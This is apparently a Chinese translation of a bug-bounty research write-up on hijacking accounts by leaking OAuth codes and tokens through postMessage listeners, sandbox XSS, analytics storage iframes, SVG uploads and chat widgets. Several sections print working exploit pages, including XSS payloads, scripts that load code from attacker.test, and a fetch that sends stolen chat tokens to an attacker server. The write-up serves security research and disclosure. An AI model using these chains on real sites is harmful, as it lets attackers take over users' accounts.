OAuth漏洞系列-在OAuth流程中所产生的账户劫持漏洞研究


声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。

[TOC]

## 背景
在很多网站的登陆过程中,你很有可能会遇到类似如下的一些登陆方式:

![](https://files.mdnice.com/user/26510/191e1c9a-4799-4837-9171-3c6390ea6ec9.png)


![](https://files.mdnice.com/user/26510/9761018d-09bf-4d04-a6e7-552473322e69.png)

授权的第三方服务可以通过谷歌、苹果、Facebook、Twitter、qq、微博或任何其他提供商。它们都使用OAuth来发布某种形式的代码或令牌来验证用户对网站的身份,而无需直接注册来登陆。

## 具体方法

### 响应类型

在OAuth流程中可以使用不同的响应类型，最常见的三种是:

1.code + state:该code(授权码)用于调用 OAuth-provider 服务器端以获取令牌,state参数用于验证正在进行操作的用户。OAuth-client负责在服务器端调用OAuth-provider之前验证状态参数。


2.id_token。是使用来自 OAuth-provider的公共证书签名的 JSON Web 令牌 (JWT)，以验证所提供的身份确实是它声称的身份。

3.令牌(token)。在服务端提供者(service provider.)的API中使用的访问令牌。

### 响应模式
在OAuth流程中可以使用多种模式向网站code提或令牌(token)，以下是四种最常见的模式：

1.Query，将查询参数作为重定向发送回网站 (https://example.com/callback?code=xxx&state=xxx)。用于“`code + state`”情况。该code只能使用一次，并且在使用该code时你需要 OAuth 客户端密钥来获取访问令牌。不建议对令牌使用此模式，因为令牌可以多次使用，并且不应最终出现在服务器日志或类似文件中。大多数 OAuth-provider不支持令牌的这种模式，仅支持code。例如：<br>
response_mode=query 被 Apple 使用。<br>

Google或Facebook使用response_type=code 这种模式<br>


2.Fragment模式。使用Fragment重定向(`https://example.com/callback#access_token=xxx`)。在这种模式下，URL的Fragment部分不会出现在任何服务器日志中，只能使用javascript访问客户端。此响应模式用于令牌。例子:<br>
response_mode=fragment被Apple和微软所使用。<br>
response_type包含id_token或token，由Google、Facebook、Atlassian和其他厂商使用。<br>

3.Web-message。使用postMessage锁定网站的固定来源: <br>
`postMessage('{“access_token”:“xxx”}',' https://example.com ')` <br>
如果支持，它通常可以用于所有不同的响应类型。如下: <br>
`response_mode=web_message`为Apple使用。 <br>
`redirect_uri = storagerelay: / /……`是Google使用的方式。 <br>
`redirect_uri = https://staticxx.facebook.com/.../connect/xd_arbiter/.. `为Facebook所使用。 <br>

4.Form-post.使用一个表单发布到有效的redirect_uri，一个常规的Post-request被发送回网站。这可以用于code和令牌。如下: <br>
`response_mode=form_post`由Apple所使用。 <br>
`ux_mode=redirect&login_uri=https://example.com/callback `被Google登录(GSI)使用。 <br>

一些 OAuth 提供商简化了OAuth 流程，例如 Google 的 GSI。这与 id_token 的常规 OAuth 流程完全一样。令牌通过 Form-POST 或 postMessage 发送回网站。(小结:令牌有两种方式被发回网站)

## 通过postMessage窃取令牌

下面将深入挖掘这个理论的原理:

我一直在寻找与postMessage实现相关的漏洞;我开发了一个Chrome插件 [1]用于检测message,并为每个标签中的所有窗口简化检查所有`postmessage`侦听器;虽然在这些侦听器中简单的 XSS 问题难以发现,但来源检查较弱或没有来源检查(注:这里需要有一定的http常识)的问题仍然很常见。

我的逻辑是:带有弱源检查或没有源检查的postMessage侦听器，它们会泄漏 `location.href`，这就是你当前访问的网站的 URL。它将直接或间接泄漏到我可能能够捕获它的其他地方。

例如，在常规起始页上，可以尝试让 OAuth 代码或令牌登陆具有这些弱 postMessage 侦听器之一的网站页面。然后，我将能够通过从不同的选项卡发送消息并取回 `location.href` 从而可以从侦听器获取令牌，如果其返回了，我们就能窃取到OAuth的tokens(令牌)，而不需要利用任何XSS漏洞。

为了进一步研究，我做了以下工作:

1.在赏金漏洞平台测试所有受欢迎项目的登陆过程

2.如果他们使用任何第三方OAuth-provider，保存他们使用的登录URL，包含所有提供者(就是应用)的客户端id、响应类型/模式和重定向uri。

3.注意网站上是否加载了任何postMessage 侦听器或任何其他第三方脚本。

在收集网站使用  OAuth-provider的所有不同方式时，很明显有一些可能的选择和组合，不同的网站决定使用不同的响应类型和模式组合。完成后，我能够将注意力集中在最流行的 OAuth-provider上，然后看看我是否可以基于其他限定符过滤网站。

## OAuth流程中需要注意的问题

首先说明一下: 破解OAuth-dance的各种方法,这里主要是指导致OAuth-provider发布有效code/令牌之间的差异,但原本要从提供商获得令牌的网站没有成功地接收和处理令牌。下文将其称为“不愉快的路径”

在成功使用OAuth流程后,令牌会从网站的 URL 中删除。确保网站未正确使用代码或令牌是使此攻击起作用的第一步，因为我想自己窃取和使用代码或令牌。

这可能会产生各种结果，但我们的想法是最终出现某种形式的错误页面或加载了第三方 javascript 以便使我们泄露令牌的页面。

有多种方法可以打破OAuth流程,这些方法本身没有任何影响，但如果受害者最终将代码或令牌仍然放在URL中，并与` location.href `链接在一起，后果可能很严重。

## 对“状态”进行攻击

OAuth规范建议将state参数与response_type=code结合使用，以确保发起流程的用户就是使用code发出令牌的用户。(其实就是证明“我是我”)

如果状态值(state)无效，code将不会被使用,因为验证状态是网站的责任。这意味着，如果攻击者可以向具有有效攻击状态的受害者发送登录流链接，那么受害者的OAuth流程将失败,代码(code)将永远不会发送给 OAuth-provider。如果攻击者可以得到它，该代码(code)仍然可以使用。

- 攻击者以“X用户登录”的形式在网站上启动登录流程。
- 攻击者使用状态值并为受害者构建一个链接，让他们用OAuth-provider登录，但使用攻击者的状态。
- 受害者使用该链接登录并重定向回该网站.
- 网站验证受害者的状态并停止处理登录流程，因为它不是一个有效状态。受害者的页面出现错误。

- 攻击者会找到从错误页面泄漏代码(code)的方法。
- 攻击者现在可以使用自己的状态和受害者泄露的code登录。

(注:如果读者这里读不懂,可以先去portswigger官网去练习一下相对应的靶场会好些)

## 响应类型/响应模式切换
改变OAuth流程中的响应类型或响应模式将影响代码或令牌返回网站的方式，这在大多数情况下会导致意想不到的行为。我还没有看到任何OAuth-provider有限制网站想要支持的响应类型或模式的选项，所以根据OAuth-provider的不同，通常至少有两种或更多的攻击方法.

还可以请求多个响应类型。有一个规范[2] 解释了当请求多个响应类型时，如何向redirect-uri提供值:

如果在一个请求中，response_type只包含要求服务器返回在查询字符串中完全编码的数据的值，那么这个多值response_type的响应中返回的数据必须在查询字符串中完全编码。此建议同时适用于成功响应和错误响应。


如果在一个请求中，response_type包含任何要求服务器返回在片段中完全编码的数据的值，那么响应中这个多值response_type返回的数据必须在片段中完全编码。此建议同时适用于成功响应和错误响应。

如果正确地遵循了这个规范，这意味着你可以要求发送到网站的代码参数，但如果你同时也要求id_token，代码参数将在Fragment部分而不是在查询字符串中发送。


对于谷歌的登录,是这样的:

```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```

将重定向到`https://example.com/callback?code=xxx&state=yyy`


但是:
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code,id_token&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow

```

将重定向到`https://example.com/callback#code=xxx&state=yyy&id_token=zzz`

如果你使用以下方法，同样的逻辑也适用于 Apple：
```
https://appleid.apple.com/auth/authorize?
response_type=code&
response_mode=query&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```

将被重定向到`https://example.com/callback?code=xxx&state=yyy`，

但是:

```
https://appleid.apple.com/auth/authorize?
response_type=code+id_token&
response_mode=fragment&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback

```

将你重定向到`https://example.com/callback#code=xxx&state=yyy&id_token=zzz`


## Redirect-uri大小写转换

一些 OAuth-provider允许在 redirect_uri 的路径中进行大小写转换，而不是真正遵循保护基于重定向的流程规范：

在将客户端Redirect-uri与预注册的 URI 进行比较时，授权服务器必须使用精确的字符串匹配，本地应用程序的 localhost Redirect-uri中的端口号除外。该措施有助于防止授权代码和访问令牌的泄漏，它还可以帮助检测混淆攻击。

这意味着，将 https://example.com/callback 作为应用程序的配置重定向 uri，以下流程仍然有效：


```
https://oauthprovider.example.com/oauth2/v2.0/authorize?
response_type=id_token&
client_id=client-id&
redirect_uri=https://example.com/CaLlBaCk&
scope=openid%20profile%20email&
nonce=1&
state=yyy

```

并将你重定向到：`https://example.com/CaLlBaCk#id_token=xxx`。我测试过的所有网站都没有使用不区分大小写的路径，因此大小写转换将触发不愉快路径，显示错误或重定向到仍然存在Fragment的登录页面。

另请注意，使用 response_type=code 这个方法更难被利用。在一个正确的OAuth流程中，在从服务提供者获取访问令牌的最后一步中，还必须提供 redirect_uri 以向服务提供者进行验证。如果 OAuth流程中使用的 redirect_uri 与网站发送给提供者的值不匹配，则不会发出访问令牌。但是，使用任何其他响应类型，例如 token 或 id_token，都不需要最后一步的验证，因为token是在重定向中直接提供的。


## 增加Redirect-uri路径

一些 OAuth-provider允许将其他数据添加到 redirect_uri 的路径中。这可能也会出现问题,例如:

有一个`https://example.com/callback redirect-uri`，发送以下内容:

```
response_type=code&
redirect_uri=https://example.com/callback%3fcode=xxx%26
```

在这些情况下会被重定向到`https://example.com/callback?code=xxx&code=real-code` 由于网站接收多个相同名称的参数，这也可能会触发一个不愉快的路径。同样地,适用于token和id_token:

```
response_type=code&
redirect_uri=https://example.com/callback%23id_token=xxx%26
```

结果是`https://example.com/callback#id_token=xxx&id_token=real-id_token`。根据javascript在有多个相同名称的参数时获取片段参数，这也可能会以一个不愉快的路径结束。

## Redirect-uri错误配置

在收集所有包含redirect_uri值的登录url时，我还可以测试其他重定向uri值是否也有效。在我测试的网站上保存的125个不同的谷歌登录流程中，有 5 个网站的起始页也是有效的 redirect_uri。例如，如果使用了 redirect_uri=https://auth.example.com/callback，那么在这 5 种情况下，其中任何一种都是有效的：
```
redirect_uri=https://example.com/

redirect_uri=https://example.com

redirect_uri=https://www.example.com/

redirect_uri=https://www.example.com
```

这对于实际使用id_token或token的网站来说特别有趣，因为response_type=code仍然会让OAuth-provider在获取令牌时在OAuth-dance的最后一步验证redirect_uri。

我现在已经为所有网站收集了一堆不太好用的路径。以下是我看到的不同案例：


.最后出现在错误页面上。

2.重定向到网站的起始页。

3.重定向回登录页面。

4.重定向回已删除参数的登录页面。

5.重定向回 OAuth-provider，但具有正确的值，具有正确的响应类型和状态，基本上识别流程无效并重试它。


我们计划专注于1、2和3，因为它们的参数仍然保存在URL中。我还得出结论，避免不太好用路径的最佳方案是第4条。

现在是时候真正开始寻找泄露信息的方法了。

由于postMessage-listener插件还记录页面上的任何iframe是否有侦听器，所以我开始关注那些在URL中有令牌的窗口的任何框架中至少有一个postMessage-listener的网站。

我会将泄漏 URL 的不同方法归类为不同的小工具，因为它们具有不同的属性让我们回顾一下我已经确定的不同类型的方法。

## Gadget 1:泄漏 URL 的弱或没有源检查 postMessage-listeners



![](https://files.mdnice.com/user/26510/c9354f22-37f8-4654-ae4f-a90e05835aa3.png)

这是符合预期的。其中一个例子是某网站的sdk，它被加载至网站上:

![](https://files.mdnice.com/user/26510/f306df6c-d0ae-4cc0-b295-d892bf3233bf.png)


这个SDK公开了一个postMessage-listener，当消息类型匹配时，它发送以下消息:


![](https://files.mdnice.com/user/26510/44283f1b-0761-42d2-a424-003c70913fa4.png)
从不同的来源发送消息给它:


```
openedwindow = window.open('https://www.example.com');
...
openedwindow.postMessage('{"type":"sdk-load-embed"}','*');
```
在发送包含位置的消息的窗口中将显示一条响应消息。网站location.href 为:




![](https://files.mdnice.com/user/26510/4a5b90d9-b6de-4528-ac76-2f3175971453.png)


可用于攻击的流程取决于代码和令牌用于登录流程的方式，攻击场景是：

1.攻击者向受害者发送一个精心制作的链接，该链接已经准备好导致OAuth流程中的一个不愉快路径。

2.受害者点击链接。新选项卡将打开一个登录流程，其中包含正在被利用的网站的一个 OAuth-provider。

3.在被利用的网站上触发了不太好用的路径，易受攻击的 postMessage-listener 被加载到受害者登陆的页面上，仍然在 URL 中包含代码或令牌。


4.攻击者发送的原始标签发送一堆postmessages至网站的新标签从而获得postmessage -listener以泄漏的当前的URL


5.攻击者发送的原始标签，然后侦听发送给它的消息。当URL在消息中返回时，代码和令牌将被提取并发送给攻击者。

6.攻击者使用代码或令牌冒充受害者登录。

## Gadget 2: 利用sandbox/第三方域上的XSS获取URL


![](https://files.mdnice.com/user/26510/2665809e-14e8-4ae7-96b9-33751762d62a.png)

示例1，从沙盒框架中窃取`window.name`

5月12日，我用这个报告了在野外发现的第一条攻击链:   ( 目前已经公开: `https://hackerone.com/reports/1567186 `)

巧合的是，两天后，也就是5月14日，Youssef Sammouda发表了一篇很棒的博客文章，解释了他使用Gmai劫持Facebook账户的方法(注: https://ysamm.com/?p=763)。这篇博客文章描述了一个类似流程。然而，这个bug并不是关于OAuth相关的，而是通过使用`iframe:d`沙盒域泄露受害者最终的URL，该沙盒域也允许加载任意javascript。沙箱访问URL中的敏感数据的原因是，当iframe加载时，它被附加到沙箱URL。


我发现的案例则有点不同。


第一个是在OAuth流程结束的页面上加载iframe。iframe是window.location对象序列化之后的版本。这是一种旧的跨域传输数据的方法，因为iframe中的页面可以得到由父节点设置的自己的`window.name`:


```
i = document.createElement('iframe');
i.name = JSON.stringify(window.location)
i.srcdoc = '<script>console.log("my name is: " + window.name)</script>';
document.body.appendChild(i)
```

![](https://files.mdnice.com/user/26510/413320bb-f8a1-47c9-b798-0c47e0fa7379.png)

在iframe中加载的域也有一个简单的XSS:

```
https://examplesandbox.com/embed_iframe?src=javascript:alert(1)
```

正如Youssef解释的那样，如果你在一个窗口的一个域上有一个XSS，这个窗口就可以到达其他相同来源的窗口，如果这些窗口之间有父/子/opener关系。


在我的例子中，我做了以下操作:

1.创建了一个恶意的页面，嵌入沙盒的iframe用XSS加载我自己的脚本:

```
<div id="leak"><iframe src="https://examplesandbox.com/embed_iframe?src=javascript:
x=createElement('script'),
x.src='//attacker.test/inject.js',
document.body.appendChild(x);" 
style="border:0;width:500px;height:500px"></iframe></div>

```

在加载到沙盒的我的脚本中，我用受害者使用的链接替换了对应内容:

```
document.body.innerHTML = 
'<a href=" " onclick="
b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
Click here to hijack token</a >';

```

我写了一个脚本,周期性检查这个链接是否打开了,我想达到的iframe是有获得window.name设置的与iframe同源的在攻击者的页面上的iframe:


```
 x = setInterval(function() {
if(parent.window.b &&
 parent.window.b.frames[0] &&
 parent.window.b.frames[0].window &&
 parent.window.b.frames[0].window.name) {
   top.postMessage(parent.window.b.frames[0].window.name, '*');
   parent.window.b.close();
   clearInterval(x);
}
}, 500);
```

然后攻击者页面就可以只听我们用window.name发送的消息:


```
<script>
window.addEventListener('message', function (e) {
 if (e.data) {
     document.getElementById('leak').innerText = 'We stole the token: ' + e.data;
 }
});
</script>

```

## Gadget 2:  示例2  带有XSS的iframe +父源检查


第二个例子是用postMessage加载了带有xss的不愉快路径的iframe;但是messages只允许来自它的父窗口的位置加载它，当iframe向父窗口请求initConfig时，location.href被发送到iframe。
主窗口像这样加载iframe:

`<iframe src="https://challenge-iframe.example.com/"></iframe>`

内容是这样的(为了更好地解释攻击，这里进行了简化):

```

<script>
window.addEventListener('message', function (e) {
  if (e.source !== window.parent) {
    // not a valid origin to send messages
    return;
  }
  if (e.data.type === 'loadJs') {
    loadScript(e.data.jsUrl);
  } else if (e.data.type === 'initConfig') {
    loadConfig(e.data.config);
  }
});
</script>
```

在这种情况下，我可以做一个类似的方法，就像第一个例子:

创建一个恶意页面，嵌入了一个沙盒的iframe，附加一个onload，在iframe加载时触发脚本。


```
<div id="leak"><iframe
id="i" name="i"
src="https://challenge-iframe.example.com/"
onload="run()"
style="border:0;width:500px;height:500px"></iframe></div>

```


因为恶意页面是iframe的父节点，所以它(恶意页面)可以通过postMessage向iframe发送消息来加载我们的脚本:  （我的理解:上面的那个页面为恶意页面，里面有iframe标签）



```
<script>
function run() {
  i.postMessage({type:'loadJs',jsUrl:'https://attacker.test/inject.js'}, '*')
}
</script>
```


在我的脚本加载到沙盒中，我用受害者的链接替换了内容:


```
document.body.innerHTML = '<a href=" " onclick="
b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
Click here to hijack token</a >';
```
周期性启动一个脚本，以检查链接是否打开，以及我想要到达的iframe是否存在，并在iframe和主窗口中运行javascript。然后我附加了一个postmessage-listener（onmessage），将消息传递回恶意窗口中的iframe:

```

x = setInterval(function() {
  if(b && b.frames[1]) {
    b.frames[1].eval(
      'onmessage=function(e) { top.opener.postMessage(e.data, "*") };' +
      'top.postMessage({type:'initConfig'},"*")'
    )
    clearInterval(x)
  }
}, 500);

```

使得iframe加载的攻击者页面，可以监听我从主窗口的iframe注入postMessage-listener代理发送的消息:


```
<script>
window.addEventListener('message', function (e) {
 if (e.data) {
     document.getElementById('leak').innerText = 'We stole the token: ' + JSON.stringify(e.data);
 }
});
</script>

```

## Gadget 3:使用API来获取界外的URL

![](https://files.mdnice.com/user/26510/10bd7825-5d50-4fa2-9a64-6792aa65a9a3.png)

Gadget 3是最有趣的,把受害者送到某个地方然后从另一个地方获取敏感数据。
### example 1 :没有进行origin检查的storage-iframe

第一个示例使用外部服务跟踪数据。这个服务添加了一个“storage iframe”:

```
<iframe
  id="tracking"
  name="tracking"
  src="https://cdn.customer1234.analytics.example.com/storage.html">
</iframe>
```
主窗口将使用postMessage与iframe对话，发送跟踪数据，这些跟踪数据将保存在storage.html所在的localStorage中:


```

tracking.postMessage('{"type": "put", "key": "key-to-save", "value": "saved-data"}', '*');
```
主窗口也可以获取以下内容:

```
tracking.postMessage('{"type": "get", "key": "key-to-save"}', '*');
```



![](https://files.mdnice.com/user/26510/83a2acde-02f6-4c94-8994-878a79a73bd9.png)


当初始化加载iframe时，使用location.href保存用户最后一个位置的键:





```
tracking.postMessage('{"type": "put", "key": "last-url", "value": "https://example.com/?code=test#access_token=test"}', '*');

```



如果你能和origin对话并且让它给你发送内容,location. href可以从这个存储中获取; 服务的postmessage监听器有一个屏蔽列表和一个白名单列表。似乎分析服务允许网站去定义这些列表:


```JavaScript
var blockList = [];
var allowList = [];
var syncListeners = [];

window.addEventListener('message', function(e) {
  // If there's a blockList, check if origin is there and if so, deny
  if (blockList && blockList.indexOf(e.origin) !== -1) {
    return;
  }
  // If there's an allowList, check if origin is there, else deny
  if (allowList && allowList.indexOf(e.origin) == -1) {
    return;
  }
  // Only parent can talk to it
  if (e.source !== window.parent) {
    return;
  }
  handleMessage(e);
});

function handleMessage(e) {
  if (data.type === 'sync') {
    syncListeners.push({source: e.source, origin: e.origin})
  } else {
  ...
}

window.addEventListener('storage', function(e) {
  for(var i = 0; i < syncListeners.length; i++) {
    syncListeners[i].source.postMessage(JSON.stringify({type: 'sync', key: e.key, value: e.newValue}), syncListeners[i].origin);
  }
}

```



此外，如果有一个基于allowList的有效源，你还可以请求同步，这将在此窗口中向您发送对localStorage所做的任何更改。


拥有存储的网站在加载OAuth-dance的不愉快路径时，并没有定义allowList-origins;这允许任何源与postMessage-listener通信，如果源是窗口的父源。方法与Gadget2类似 :


我创建了一个恶意页面，它嵌入了存储容器的iframe，并附加了一个onload，以便在加载iframe时触发脚本。



代码如下:
```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/storage.html"
onload="run()"></iframe></div>
```
由于恶意页面现在是iframe的父页面，并且在allowList中没有定义任何起源，因此恶意页面可以向iframe发送消息，告诉存储发送对存储的任何更新的消息。我还可以添加一个监听器到恶意页面，以监听任何来自存储的同步更新:


```JavaSCript
<script>
function run() {
  i.postMessage({type:'sync'}, '*')
}
window.addEventListener('message', function (e) {
 if (e.data && e.data.type === 'sync') {
     document.getElementById('leak').innerText = 'We stole the token: ' + JSON.stringify(e.data);
 }
});
</script>
```
该恶意网页还会包含一个普通链接，供受害者点击:

```html
<a href=" "
target="_blank">Click here to hijack token</a >';

```

受害者会点击链接，通过OAuth-dance，最终在加载跟踪脚本和存储框架的不愉快路径上结束。<br>
存储iframe获得last-url的更新。因为更新了`localStorage`，所以`window.storage-event`会在恶意页面的iframe中触发，现在每当存储发生变化时，恶意页面就会得到一个带有受害者当前URL的postMessage:


![](https://files.mdnice.com/user/26510/00d40ddb-d6e9-4a42-ac62-53f197e67622.png)


### Gadget 3 示例2：客户在没有origin检查的情况下混淆了CDN-DIY  storage-svg

由于分析服务本身就有漏洞，我也很有兴趣看看我是否能找到一种方法来泄漏那些为存储框架配置了正确来源的网站的url。


当我开始在线搜索`CDN.analytics.example.com-domain`时，没有客户的部分，我注意到这个CDN也包含了服务客户上传的图片:


```
https://cdn.analytics.example.com/img/customer42326/event-image.png
https://cdn.analytics.example.com/img/customer21131/test.png
```


我还注意到有svg文件作为内联的内容类型:image/svg+xml在这个CDN:


```
https://cdn.analytics.example.com/img/customer54353/icon-register.svg
```

我注册了一个试用用户，上传了我自己的资产，也显示在CDN上:


```
https://cdn.analytics.example.com/img/customer94342/tiger.svg
```

如果您随后对CDN使用特定于客户的子域，则仍然会提供image。这个URL（会起作用）:

```
https://cdn.customer12345.analytics.example.com/img/customer94342/tiger.svg
```


![](https://files.mdnice.com/user/26510/7babc907-8b50-4d84-b018-3e1177446fda.png)



这意味着ID为94342的客户可以在客户12345的存储中渲染svg文件。

我上传了一个带有简单xss有效载荷的svg文件:

```
https://cdn.customer12345.analytics.example.com/img/customer94342/test.svg


```

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 500 500" width="100%" height="100%" version="1.1">
<script xlink:href="data:,alert(document.domain)"></script>
</svg>
```


![](https://files.mdnice.com/user/26510/64e93bb0-560b-445b-ad15-6f263c8150b9.png)


CDN为`img/`下的所有内容添加了一个`Content-Security-Policy: default-src 'self'-header`。你还可以看到服务器头文件中提到了S3，这表明内容被上传到了S3桶中:

![](https://files.mdnice.com/user/26510/62bb836f-6efd-4355-8ed0-bcdfb06a8484.png)

S3的一个有趣的性质是，目录在S3中并不是真正的目录;键之前的路径称为“前缀”。这意味着S3不关心/是否经过URL编码，如果您对URL中的每个斜杠进行URL编码，它仍然会提供内容。如果我将URL中的img/更改为img%2f，仍然可以解析图像。然而，在这种情况下，csp头被删除，XSS触发:



![](https://files.mdnice.com/user/26510/6a80a42c-f2ca-47b0-8897-0f3d43d1e0d3.png)

然后，我可以上传一个SVG，它将创建与常规的storage.html相同的storage-handler和postMessage-listener形式，但会创建一个空的allowList。这让我能够进行同样的攻击，即使是在那些正确定义了可以与存储对话的允许源的网站上。
我上传了一个像这样的SVG:


```

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 5 5" width="100%" height="100%" version="1.1">
<script xlink:href="data:application/javascript;base64,dmFyIGJsb2NrTGlzdCA9IFtdOwp2YXIgYWxsb3dMaXN0ID0gW107Ci4uLg=="></script>
</svg>
```

然后，我可以使用与示例1相同的方法，但在iframe中嵌入的不是 storage.html，而是SVG与url编码斜杠:


```html

<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg"
onload="run()"></iframe></div>


```


由于没有网站能够自己修补这个问题，我转而向负责CDN的分析供应商发送了一份报告:


![](https://files.mdnice.com/user/26510/44dee1d0-9a3d-4a58-a806-5171f82df8cf.png)


在第三方上查看错误配置的bug的整个想法主要是确认有多种方法来实现令牌的泄漏，因为第三方有一个bug赏金，这只是同一种bug的不同接收者，不同的是，影响是针对分析服务的所有客户。在这种情况下，第三方的客户实际上有能力正确地配置该工具，使其不向攻击者泄漏数据。然而，由于敏感数据仍然被发送给第三方，所以看看是否有某种方法可以完全绕过客户对工具的正确配置是很有趣的。


### Gadget 3 示例3 ：chat-widget API

最后一个例子是基于chat-widget小部件，它出现在网站的所有页面上，甚至包括错误页面。有多个postmessage-监听器，其中一个没有适当的origin检查，只允许你启动聊天弹出框。另一个监听器对chat-widget进行严格的origin检查，以接收初始化调用和当前用户使用的chat-api-令牌。


```html
<iframe src="https://chat-widget.example.com/chat"></iframe>
<script>
window.addEventListener('message', function(e) {
  if (e.data.type === 'launch-chat') {
    openChat();
  }
});

function openChat() {
  ...
}

var chatApiToken;
window.addEventListener('message', function(e) {
  if (e.origin === 'https://chat-widget.example.com') {
    if (e.data.type === 'chat-widget') {
      if (e.data.key === 'api-token') {
        chatApiToken = e.data.value;
      }
      if(e.data.key === 'init') {
        chatIsLoaded();
      }
    }
  }
});

function chatIsLoaded() {
  ...
}

```


当chat-iframe加载时:


1.如果聊天小部件的localStorage中存在一个聊天api令牌，它将使用postMessage将这个api令牌发送给它的父组件。如果没有chat-api令牌存在，它就不会发送任何东西。

2.当iframe加载后，它将发送一个带有`{"type": "chat-widget"， "key": "init"}`的postMessage给它的父组件。


如果你点击主窗口的聊天图标:

1.如果chat-api-令牌还没有被发送，那么chat-widget会创建一个令牌，并将其放在自己的源的localStorage中，并将其postMessage发送给父窗口。


2.然后父窗口将对聊天服务进行api调用。api接口被cors限制为服务配置的特定网站。您必须为api调用提供一个有效的带有chat-api-令牌的origin头，以允许发送请求。


3.来自主窗口的api调用将包含location.href并使用chat-api-token将其注册为访问者的“当前页面”。然后，响应将包含一些令牌，以连接到一个websocket来启动聊天会话:


```json
{
  "api_data": {
    "current_page": "https://example.com/#access_token=test",
    "socket_key": "xxxyyyzzz",
    ...
  }
}

```


在这个例子中，我意识到chat-api-令牌的声明总是会通知给chat-widget iframe的父组件，如果我得到了chat-api-令牌，我就可以使用令牌发出服务器端请求，然后将我自己的人工Origin-header添加到api调用中，因为CORS-header只对浏览器重要。这将导致以下逻辑:


创建了一个嵌入chat-widget的iframe的恶意页面，添加了一个postMessage-listener来监听聊天api令牌。此外，如果我没有在2秒内获得api令牌，触发一个事件来重新加载iframe。这是为了确保我也支持从未发起过聊天的受害者，因为我可以触发远程打开聊天，所以我首先需要聊天api令牌从服务器端开始轮询聊天api中的数据。


```html

<div id="leak"><iframe
id="i" name="i"
src="https://chat-widget.example.com/chat" onload="reloadToCheck()"></iframe></div>
<script>
var gotToken = false;
function reloadToCheck() {
  if (gotToken) return;
  setTimeout(function() {
    document.getElementById('i').src = 'https://chat-widget.example.com/chat?' + Math.random();
  }, 2000);
}
window.onmessage = function(e) {
  if (e.data.key === 'api-token') {
    gotToken = true;
    lookInApi(e.data.value);    
  }
}
launchChatWindowByPostMessage();
</script>
```


2.添加了一个链接到恶意页面，以打开登录流，该登录流最终会出现在页面上，URL中带有令牌的chat-widget:


```html

<a href=" " onclick="b=window.open('https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...');">Click here to hijack token</a >
```

3.launchChatWindowByPostMessage()函数将持续发送一个postMessage到主窗口，如果打开，以启动chat-widget:

```JavaScript

function launchChatWindowByPostMessage() {
  var launch = setInterval(function() {
    if(b) { b.postMessage({type: 'launch-chat'}, '*'); }
  }, 500);
}
```

4.当受害者单击该链接并最终出现在错误页面时，聊天将启动，并创建一个chat-api-令牌。我在恶意页面上重新加载chat-widget的iframe将通过postMessage获得API令牌，然后我可以开始在API中查找受害者的当前url:


```JavaScript

function lookInApi(token) {
  var look = setInterval(function() {
    fetch('https://fetch-server-side.attacker.test/?token=' + token).then(e => e.json()).then(e => {
      if (e &&
        e.api_data &&
        e.api_data.current_url &&
        e.api_data.current_url.indexOf('access_token') !== -1) {
          var payload = e.api_data.current_url
          document.getElementById('leak').innerHTML = 'Attacker now has the token: ' + payload;
          clearInterval(look);
      }
    });
  }, 2000);
}
```

5.服务器端页面`https://fetch-server-side.attacker.test/?token=xxx`将使用添加的origin头进行api调用，使Chat-API认为我使用它作为一个合法的起源:


```JavaScript

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})
async function getDataFromChatApi(token) {
  return await fetch('https://chat-widget.example.com/api', {headers:{Origin: 'https://example.com', 'Chat-Api-Token': token}});
}
function handleRequest(request) {
  const token = request.url.match('token=([^&#]+)')[1] || null;
  return token ? getDataFromChatApi(token) : null;
}

```
6.当受害者点击链接，经过OAuth-dance，并在添加了令牌的错误页面上登陆时，chat-widget会突然弹出，注册当前URL，攻击者将获得受害者的访问令牌。


## 其他关于url泄露的思路

使用任何可用的响应模式使URL泄漏可能是一个潜在的方法，但是我目前还无法在野外找到漏洞


### 域上的一个页面，它将任何postMessage路由到它的打开器


因为所有web_message响应类型都不能验证源的任何路径，所以有效域上的任何URL都可以接收带有令牌的postMessage。如果域中的任何页面上都有某种形式的postMessage-listener代理，它接收发送给它的任何消息并将所有内容发送到它的打开器，那么我可以创建一个双窗口。


攻击者第1页:

```html
<a href=" " onclick="a=window.open('attacker2.html'); return false;">Accept cookies</a >
```

攻击者第2页:

```html
<a href=" " onclick="b=window.open('https://accounts.google.com/oauth/...?', '', 'x'); location.href = 'https://example.com/postmessage-proxy'; return false;">Login to google</a >
```

`https://example.com/postmessage-proxy` 会有一些类似的内容:

```JavaScript

// Proxy all my messages to my opener:
window.onmessage=function(e) { opener.postMessage(e.data, '*'); }
```

我可以使用任何web_message-response模式将令牌从OAuth-provider向下提交到有效的起源https://example.com，但端点将进一步将令牌发送到opener，即攻击者的页面。<br>
这个流程似乎不太可能，它需要两次点击:一次是在攻击者和网站之间创建一个打开器关系，第二次是启动拥有合法网站作为OAuth弹出的打开器的OAuth流。<br>
